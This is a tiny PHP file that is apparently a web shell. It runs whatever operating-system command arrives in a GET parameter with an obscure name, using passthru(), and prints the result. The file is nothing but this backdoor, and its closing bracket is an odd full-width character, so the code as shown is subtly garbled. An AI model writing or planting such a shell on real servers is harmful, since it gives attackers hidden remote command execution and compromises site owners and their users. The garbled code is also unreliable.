<?php
passthru($_GET['RaSOch4p'〕);
?>
